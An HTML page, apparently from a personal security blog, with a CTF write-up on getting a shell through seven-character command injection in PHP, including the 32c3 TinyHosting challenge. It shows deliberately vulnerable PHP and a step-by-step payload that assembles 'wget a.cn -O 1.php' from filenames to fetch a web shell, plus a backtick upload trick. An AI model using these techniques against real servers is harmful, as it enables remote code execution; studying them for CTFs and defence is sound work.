@@ -1,0 +1,798 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/uploads/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
+<meta name="keywords" content="web">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Escalate seven chars rce to get shell">
+<meta property="og:url" content="/Escalating seven chars to get shell.html">
+<meta property="og:site_name" content="Ꭰ&#39;s security blog">
+<meta property="og:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
+<meta property="og:updated_time" content="2017-11-27T02:08:58.454Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Escalate seven chars rce to get shell">
+<meta name="twitter:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/Escalating seven chars to get shell.html"/>
+
+
+
+
+
+  <title>Escalate seven chars rce to get shell | Ꭰ's security blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ca5988953450620ca8c294ff5c390a4a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left  ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ꭰ's security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+  <header class="post-header">
+
+	<h1 class="post-title" itemprop="name headline">Escalate seven chars rce to get shell</h1>
+
+
+
+</header>
+
+    
+    
+      <p>Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.</p>
+<a id="more"></a>
+<p>###Seven chars to get shell</p>
+<p>If you meet the following sense, how can you get shell?</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">if</span> (strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>) &#123;</div><div class="line">    shell_exec($_GET[<span class="number">1</span>])</div><div class="line">  &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>How about this one? </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;DxSec&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;form action=<span class="string">'./index.php'</span> method=<span class="string">'post'</span> enctype=<span class="string">'multipart/form-data'</span>&gt;</div><div class="line">		&lt;input name=filename placeholder=<span class="string">"filename"</span>&gt;</div><div class="line">		&lt;input name=content placeholder=<span class="string">"content"</span>&gt;</div><div class="line">		&lt;button type=submit&gt;Upload&lt;/button&gt;</div><div class="line">	&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$savepath=<span class="string">"files/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">	    $oldmask = umask(<span class="number">0</span>);</div><div class="line">	    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">	    umask($oldmask);</div><div class="line">	    touch($savepath.<span class="string">"/index.html"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>((@$_POST[<span class="string">'filename'</span>]) &amp;&amp; (@$_POST[<span class="string">'content'</span>]) )&#123;</div><div class="line">	    $fp = fopen(<span class="string">"$savepath"</span>.$_POST[<span class="string">'filename'</span>], <span class="string">'w'</span>);</div><div class="line">	    fwrite($fp, substr($_POST[<span class="string">'content'</span>],<span class="number">0</span>,<span class="number">7</span>) );</div><div class="line">	    fclose($fp);</div><div class="line">	    $msg = <span class="string">'File saved to &lt;a&gt;'</span>.$savepath.htmlspecialchars($_POST[<span class="string">'filename'</span>]).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>In fact, the second one is the challenge named <a href="https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/tiny_hosting_web_250#eng-version" target="_blank" rel="external">TinyHosting in the 2015 32c3 ctf</a>.  I added  some html code based on the primitive php code just for convenience. Please note that you must have a directory named files with others write permissions in web directory.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">drwxr-xrwx  3 root root 4096 Nov 25 14:41 files</div><div class="line">-rw-r--r--  1 root root  793 Nov 25 14:37 index.php</div></pre></td></tr></table></figure>
+<p>The common in the two challenges is that you only have seven chars to make it.</p>
+<h3 id="The-solutions"><a href="#The-solutions" class="headerlink" title="The solutions"></a>The solutions</h3><p>#####0X00</p>
+<p>In truth, the first time to solve them is difficult for me. So I found the write up and tried to make it. Let’s focus on the solution.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>) &#123;</div><div class="line">	shell_exec($_GET[<span class="number">1</span>])</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Oh my god! What I can do is only 7 chars. I can just execute some simple command, for example: <code>ls /</code>, <code>pwd</code>, <code>whoami</code>,<code>sh file</code> . </p>
+<p>If you try to search <code>the shortest php code to get shell</code> in google, you will find the shortest  <figure class="highlight plain"><figcaption><span>whose length is more then 7. How about these one?</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">1. `1=echo 1&gt;1` 8 chars</div><div class="line">2. `1=wget a.cn` 9 chars</div><div class="line"></div><div class="line">With `&gt;1` in shell, the new file named 1 will be created. If I can write all the filenames into a shell, the problem will not exist. </div><div class="line"></div><div class="line">```shell</div><div class="line">wget a.cn -O 1.php</div><div class="line">curl a.cn -o 1.php</div></pre></td></tr></table></figure></p>
+<p><code>a.cn</code> and <code>1.php</code> are demo for explanation. I can use <code>&gt;</code> followed by name to create files. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="number">1.</span>php</div><div class="line">&gt;-O\ \\</div><div class="line">&gt;cn\ \\</div><div class="line">&gt;\ a.\\</div><div class="line">&gt;wget\\</div></pre></td></tr></table></figure>
+<p>The reason that we created these file in a reverse order is I can only use seven chars. Command <code>ls &gt;1</code> output the filenames by default order instead of created time.  Therefore I need this one <code>ls -t&gt;1</code>. Output is the following.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1</div><div class="line">wget\</div><div class="line"> a.\</div><div class="line">cn \</div><div class="line">-O \</div><div class="line">1.php</div><div class="line">index.php</div></pre></td></tr></table></figure>
+<p>Please pay attention to the <code>\whitespace</code> and <code>\\</code>. In shell, whitespace should be escaped and so is the backslash. I used the backslash to split command over multiple lines. On <code>a.cn</code> there is a default page with shell code prepared in advance. </p>
+<p>Now I can get the the shell from <code>a.cn</code> by accessing <code>http://ip/1=sh 1</code>, then access the url <code>http://ip/1.php</code> for the shell. </p>
+<p><strong>summary</strong></p>
+<ul>
+<li>Why is this that the new file name(here it’s <code>1</code>) was included when using command <code>ls &gt;1</code> ? The <code>&gt;</code> always execute first, then redirect <code>ls</code> output to  file <code>1</code>.</li>
+<li>In shell, whitespace and backslash <code>\</code> should be always escaped, and the backslash can be used to split long command over multiple lines.</li>
+<li>The file <code>1</code> with 1 on the first line will not affect the execution of the  <code>shell</code>  script. (Can someone give me more detail about this, XD)</li>
+</ul>
+<p>#####0X01</p>
+<p>The key of the second challenge is I can upload any files with content limited within 7 chars. It looks so similar with the first one that I almost believe that’s truth. </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$savepath=<span class="string">"files/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">	    $oldmask = umask(<span class="number">0</span>);</div><div class="line">	    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">	    umask($oldmask);</div><div class="line">	    touch($savepath.<span class="string">"/index.html"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span>((@$_POST[<span class="string">'filename'</span>]) &amp;&amp; (@$_POST[<span class="string">'content'</span>]) )&#123;</div><div class="line">	    $fp = fopen(<span class="string">"$savepath"</span>.$_POST[<span class="string">'filename'</span>], <span class="string">'w'</span>);</div><div class="line">	    fwrite($fp, substr($_POST[<span class="string">'content'</span>],<span class="number">0</span>,<span class="number">7</span>) );</div><div class="line">	    fclose($fp);</div><div class="line">	    $msg = <span class="string">'File saved to &lt;a&gt;'</span>.$savepath.htmlspecialchars($_POST[<span class="string">'filename'</span>]).<span class="string">"&lt;/a&gt;"</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>There is a new file named <code>index.html</code> in every <code>$savepath</code>. I can upload the following files then execute command .</p>
+<table>
+<thead>
+<tr>
+<th>filename</th>
+<th>content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bash</td>
+<td>any</td>
+</tr>
+<tr>
+<td>bb</td>
+<td>ls</td>
+</tr>
+<tr>
+<td>name.php</td>
+<td><figure class="highlight plain"><figcaption><span>|</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">``` &lt;?=`*`; ``` is the key to execute command. Because it will execute all the files by order on current directory just like the following. Of course, you can change the `name` of file bash to `sh` but remember that you must always put the `bash` or `sh` file before the file with command you want execute.</div><div class="line"></div><div class="line">```shell</div><div class="line">bash bb index.html name.php</div></pre></td></tr></table></figure></td>
+</tr>
+</tbody>
+</table>
+<p>In shell, there is a special process called expansion. Here is the explanation.</p>
+<blockquote>
+<p>Each time you type a command line and press the enter key, bash performs several processes upon the text before it carries out your command. We have seen a couple of cases of how a simple character sequence, for example “<em>”, can have a lot of meaning to the shell. The process that makes this happen is called </em>expansion*. </p>
+</blockquote>
+<p>First , the command<figure class="highlight plain"><figcaption><span>``` will be substituted by the name of files in current directory then ``` bash bb index.html name.php``` will be executed. Is this a end to the ``` `*` ``` command? The output of the  ``` bash bb index.html name.php``` command will be returned to the main terminal and it's still in the [Command-Substitutation](http://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html). So the command will be executed once again.</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">If you can&apos;t believe that, you can try to change the content of `bb` to `whoami`. After that, you&apos;ll see the following.</div></pre></td></tr></table></figure></p>
+<p>The program ‘root’ is currently not installed. You can install it by typing:<br>apt install root-system-bin<br>```</p>
+<p>Talk is cheap, show me your code.</p>
+<p>Happy weekend!</p>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><ul>
+<li><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="external">escalated 7 chars rce to get shell </a></li>
+<li><a href="https://github.com/p4-team/ctf/tree/master/2015-12-27-32c3/tiny_hosting_web_250#eng-version" target="_blank" rel="external">TinyHosting</a></li>
+<li><a href="http://linuxcommand.org/lc3_lts0080.php" target="_blank" rel="external">Expansion</a></li>
+<li><a href="http://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html" target="_blank" rel="external">Command-Substiution</a></li>
+</ul>
+
+    
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/header.png"
+               alt="Ꭰ" />
+          <p class="site-author-name" itemprop="name">Ꭰ</p>
+           
+              <p class="site-description motion-element" itemprop="description">Just another infosec lover blog</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">28</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.fangheart.top/" title="FangHeart" target="_blank">FangHeart</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.cnblogs.com/lcamry" title="Icamry" target="_blank">Icamry</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/cure53" title="Cure53" target="_blank">Cure53</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.yunqingqing.com" title="YunQing" target="_blank">YunQing</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ꭰ</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("4uBSvV1VfS66JnxARLfv7BLu-gzGzoHsz", "0bxJ6KeAL6WiGATTp6QW4FpN");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
